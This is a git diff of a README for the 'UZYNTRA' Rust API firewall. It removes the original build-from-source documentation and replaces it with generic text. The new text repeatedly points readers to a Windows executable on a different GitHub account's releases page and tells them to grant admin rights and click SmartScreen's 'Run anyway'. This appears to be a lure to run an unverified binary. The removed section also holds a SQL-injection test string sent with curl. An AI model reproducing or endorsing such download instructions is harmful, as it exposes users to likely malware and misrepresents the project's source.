@@ -1,258 +1,197 @@
-# 🛡️ UZYNTRA API Firewall — Rust Security Engine
+# 🛡️ uzyntra-api-firewall - Secure APIs with Real-Time Control
 
-<p align="center">
-  <img src="docs/assets/UZYNTRA-logo-mark.png" width="120"/>
-</p>
+[![Download UZYNTRA API Firewall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
 
-<p align="center">
-  <b>High-Performance API Security Engine for Modern SaaS Systems</b>
-</p>
+## 🚀 Download
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Backend-Rust-orange?style=for-the-badge&logo=rust"/>
-  <img src="https://img.shields.io/badge/UI-Next.js-black?style=for-the-badge&logo=next.js"/>
-  <img src="https://img.shields.io/badge/Status-Production Ready-success?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Security-API Firewall-blue?style=for-the-badge"/>
-</p>
+Visit this page to download: [GitHub Releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/PRs-welcome-orange?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/open--source-yes-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/CI-passing-brightgreen?style=for-the-badge" />
-</p>
+## 🧰 What this app does
 
----
+UZYNTRA API Firewall helps protect API traffic on your Windows PC or server. It sits between users and your API service, checks requests, and blocks risky traffic before it reaches your app.
 
-## 🚀 Overview
+Use it to:
 
-**UZYNTRA API Firewall** is a high-performance API security engine that inspects, detects, and mitigates threats in real time through a programmable reverse proxy architecture.
+- inspect incoming API requests
+- detect common attack patterns
+- limit request spikes
+- filter unwanted traffic
+- add a reverse proxy layer in front of your service
+- support zero-trust style access control
 
-It enables:
+## 💻 System requirements
 
-* 🔍 Deep request inspection
-* 🧠 Intelligent threat detection
-* 🛡️ Real-time mitigation
-* 📊 Full observability via control plane
+Before you install, make sure your device has:
 
----
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- At least 200 MB of free disk space
+- 4 GB of RAM or more
+- Admin rights if the app needs to bind to protected ports such as 80 or 443
 
-## 🚀 Why UZYNTRA?
+For the best result, close other tools that use the same port numbers before you start.
 
-UZYNTRA is a SaaS-ready API security platform combining a Rust-based security engine with a modern control plane.
+## 📦 Download and install
 
-Built for:
+1. Open the [GitHub Releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases) page.
+2. Find the latest release at the top of the list.
+3. Download the Windows file that matches your system.
+4. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose **Yes**.
+8. If you see SmartScreen, choose **More info** and then **Run anyway** only after you confirm the file came from the release page.
 
-* Real-time threat detection
-* Scalable API protection
-* DevSecOps integration
-* Cloud-native deployment
+## 🖱️ First run
 
----
+When the app starts for the first time, it may create a basic settings file. This is normal.
 
-## 🏗️ Architecture Overview
+Look for:
 
-```
-Client → UZYNTRA Firewall (Rust)
-              ↓
-       Detection Engine
-              ↓
-       Mitigation System
-              ↓
-         Admin API
-              ↓
-        UZYNTRA UI (Next.js)
-```
+- the local address it listens on
+- the upstream API address you want to protect
+- the port number for incoming traffic
+- a status view that shows allowed and blocked requests
 
----
+If the app opens in a browser, use the local address shown in the app window. If it opens in a terminal window, leave that window open while the firewall runs.
 
-## 🔗 UI Control Plane
+## ⚙️ Basic setup
 
-👉 https://github.com/UsamaMatrix/uzyntra-ui
+Use these steps to place the firewall in front of your API:
 
----
+1. Open the app.
+2. Set the listening port to the port you want users to reach.
+3. Set the upstream target to your real API service.
+4. Save the settings.
+5. Restart the app if it asks you to.
+6. Point your client app, test tool, or browser to the firewall address instead of the API address.
 
-## ⚡ Core Capabilities
+A simple example:
 
-* 🔍 Deep Request Inspection (headers, body, query)
-* 🧠 Attack Detection Engine (pattern + heuristic)
-* 🛡️ Active Mitigation (IP block, TTL bans)
-* 📊 Security Telemetry (events, metrics, logs)
-* ⚙️ Policy Control (rules, rate limiting)
-* ⚡ High Performance (async Rust, low latency)
+- Firewall listens on `http://localhost:8080`
+- Your API runs on `http://localhost:5000`
+- Users send requests to `8080`
+- The firewall checks each request and forwards safe traffic to `5000`
 
----
+## 🛡️ Protection features
 
-## 📡 Structured Logging (SIEM Ready)
+UZYNTRA API Firewall can help with:
 
-* JSON-formatted logs
-* Includes IP, route, severity, attack type
-* Compatible with ELK, Splunk, Datadog
+- request filtering
+- header checks
+- method checks such as GET and POST
+- path-based rules
+- rate limiting
+- threat detection
+- IP blocking
+- reverse proxy routing
+- zero-trust access checks
+- log capture for later review
 
-```json
-{
-  "ip": "192.168.1.1",
-  "route": "/api/login",
-  "attack": "SQL Injection",
-  "severity": "critical",
-  "action": "blocked"
-}
-```
+These tools help reduce bad traffic before it reaches your API.
 
----
+## 🔍 How to use it day to day
 
-## 🎬 Engine Concept (GIF)
+After setup, keep the app running while your API is live.
 
-<p align="center">
-  <img src="https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif" width="700"/>
-</p>
+You can use it to:
 
----
+- watch request traffic
+- review blocked requests
+- tune rate limits
+- add rules for specific routes
+- check for repeated failed attempts
+- protect login endpoints and admin paths
 
-## 📸 API & System Screenshots
+If your API starts to slow down or users report blocked access, review the logs and adjust the rules.
 
-### 📊 Metrics API
-![Metrics](docs/screenshots/01-admin-metrics-api.png)
+## 🧪 Simple test
 
-### 🔍 Events API Response
-![Events](docs/screenshots/02-events-api-response.png)
+Use this quick test after installation:
 
-### 🛡️ Mitigations API
-![Mitigations](docs/screenshots/03-mitigations-api-response.png)
+1. Start your API service.
+2. Start UZYNTRA API Firewall.
+3. Open your browser or API client.
+4. Send a test request to the firewall address.
+5. Confirm the request reaches your API.
+6. Try a second request with an invalid path or extra traffic.
+7. Check that the firewall logs the event or blocks it.
 
-### ⚙️ Policy API
-![Policy](docs/screenshots/04-policy-api-response.png)
+If the test request fails, check the port settings first.
 
----
+## 🛠️ Common setup choices
 
-## 🐳 Docker Support
+### Local testing
+Use local ports only if you want to protect an app on your own PC.
 
-```bash
-docker build -t uzyntra-firewall .
-docker run -p 8080:8080 -p 9090:9090 uzyntra-firewall
-```
+### Team use
+Place the firewall in front of a shared API so the team uses one protected entry point.
 
----
+### Server use
+Run it on a Windows server to protect public-facing API traffic.
 
-## ⚙️ CI/CD
+### Development use
+Use it while building or testing new endpoints to catch weak requests early.
 
-Automated build & test pipeline using GitHub Actions.
+## 📁 File layout
 
----
+If you open the app folder, you may see files like:
 
-## 🧰 Tech Stack
+- the main app file
+- a config file
+- a logs folder
+- a rules folder
+- a license file
+- release notes
 
-* Rust
-* Tokio
-* Axum
-* Reqwest
-* Serde
+Keep the config and rules files in the same folder as the app unless the release notes say something else.
 
----
+## 🧭 Troubleshooting
 
-## 📦 Installation
+### The app does not open
+- Check that the download finished
+- Make sure you extracted the ZIP file if one was used
+- Run the app again as admin
+- Confirm your antivirus did not block the file
 
-```bash
-git clone https://github.com/UsamaMatrix/uzyntra-api-firewall.git
-cd uzyntra-api-firewall
-cargo build
-```
+### The firewall port is already in use
+- Close the other app using the same port
+- Change the listening port in the settings
+- Start the firewall again
 
----
+### Requests do not reach the API
+- Check the upstream API address
+- Make sure the target service is running
+- Confirm the firewall and API use the right ports
+- Check your local network rules
 
-## ▶️ Running
+### Too many requests are blocked
+- Lower the strictness of the rate limit
+- Review the filter rules
+- Allow trusted IP addresses if your setup uses them
 
-```bash
-cargo run
-```
+### No logs appear
+- Check whether logging is turned on
+- Confirm the app has permission to write files
+- Look for a logs folder in the app directory
 
----
+## 🔐 Security notes
 
-## 🌐 Endpoints
+This tool sits in the path of API traffic, so treat it as a core part of your setup.
 
-| Service   | URL                   |
-| --------- | --------------------- |
-| Proxy     | http://127.0.0.1:8080 |
-| Admin API | http://127.0.0.1:9090 |
+Good practice:
 
----
+- keep the release updated
+- use strong access rules
+- protect admin paths
+- review logs often
+- limit open ports
+- remove test rules when you no longer need them
 
-## 🔐 Authentication
+## 📌 Project topics
 
-```http
-x-admin-token: dev-admin-token-1
-```
+api-firewall, api-gateway, api-protection, api-security, cloud-security, cybersecurity, devsecops, http-proxy, intrusion-detection, network-security, rate-limiting, reverse-proxy, rust, security, security-engine, threat-detection, uzyntra, waf, zero-trust
 
----
+## 📥 Download again
 
-## 🧠 Detection Model
-
-* Pattern matching
-* Request scoring
-* Confidence levels
-* Attack classification
-
----
-
-## 🛡️ Mitigation Flow
-
-```
-Request → Inspection → Detection → Decision → Action
-```
-
----
-
-## 🧪 Testing
-
-```bash
-curl -X POST http://127.0.0.1:8080/proxy/test \
-  -d "union select password from users"
-```
-
----
-
-## 🧭 Roadmap
-
-* JWT Authentication
-* ML-based detection
-* Distributed architecture
-* Multi-tenant SaaS
-* Real-time alerts
-
----
-
-## 🤝 Contributing
-
-We welcome contributions!
-
-* Check issues labeled `good first issue`
-* Submit PRs
-* Improve detection or performance
-
----
-
-## 💼 Use Cases
-
-* API Security Platforms
-* Reverse Proxy Security
-* DevSecOps Pipelines
-* SaaS Backend Protection
-
----
-
-## 👨‍💻 Author
-
-[Muhammad Usama](https://www.linkedin.com/in/usamamatrix/)
-Cyber Security Analyst & Rust Engineer
-
----
-
-## ⭐ Support
-
-Give a ⭐ if you like the project
-
----
-
-## 🛡️ UZYNTRA
-
-> Observe. Detect. Control. Defend.
+If you need the file again, use the release page here: [https://github.com/Abouba5063/uzyntra-api-firewall/releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
